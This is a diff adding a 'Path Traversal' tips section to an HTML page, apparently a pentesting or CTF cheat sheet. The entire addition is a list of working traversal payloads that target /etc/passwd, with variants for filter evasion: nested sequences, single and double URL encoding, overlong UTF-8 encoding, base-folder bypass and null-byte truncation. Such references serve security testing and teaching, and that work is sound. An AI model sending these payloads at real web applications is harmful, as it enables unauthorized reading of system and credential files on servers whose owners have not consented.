@@ -170,6 +170,78 @@
 
 
 
+<div class="accordion">
+
+    <button class="accordion-header">
+
+        <span>Path Traversal</span>
+
+        <span class="accordion-icon">+</span>
+
+    </button>
+
+    <div class="accordion-content">
+
+        <h2 id="tips">TIPS</h2>
+
+<ul>
+  <li>
+    <p>Normal traversal</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ../../../etc/passwd
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Absolute path</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  /etc/passwd
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Nested traversal</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ....//....//etc/passwd
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>URL Encode</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  %2e%2e%2f
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Double URL Encode</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  %252e%252e%252f
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Non-standard encoding</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ..%c0%af
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Base folder bypass</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  /var/www/images/../../../etc/passwd
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Null byte</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ../../../etc/passwd%00.png
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+
+    </div>
+
+</div>
+
+
+
 </div>
 
 <script>
